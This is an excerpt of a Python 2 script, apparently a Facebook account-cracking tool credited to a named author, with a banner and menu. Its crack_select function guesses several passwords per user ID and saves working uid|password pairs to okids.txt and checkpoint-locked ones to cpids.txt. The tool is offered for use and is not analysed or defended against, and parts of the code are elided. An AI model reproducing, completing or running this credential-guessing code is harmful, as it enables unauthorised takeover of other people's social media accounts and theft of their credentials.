...
#Script Edited By @Mr.Wahab.Awara
#Utf-8 python 
...
(_______)|/     \||/     \||/     \||/ \___/ 
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: Mr.WAHAB.AWARA
\033[1;92mFb \033[1;93m    : m.fb.com/Mr.WaHaB.AwArA.420
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://facebook.com/Mr.WaHaB.AwArA.420')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[Mr.W-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[Mr.W-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[Mr.W-OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('okids.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;31m[Mr.W-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[Mr.W-OK]\033[0m ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('okids.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;31m[Mr.W-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks TechQaiser.& Also SyedZada Bro
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
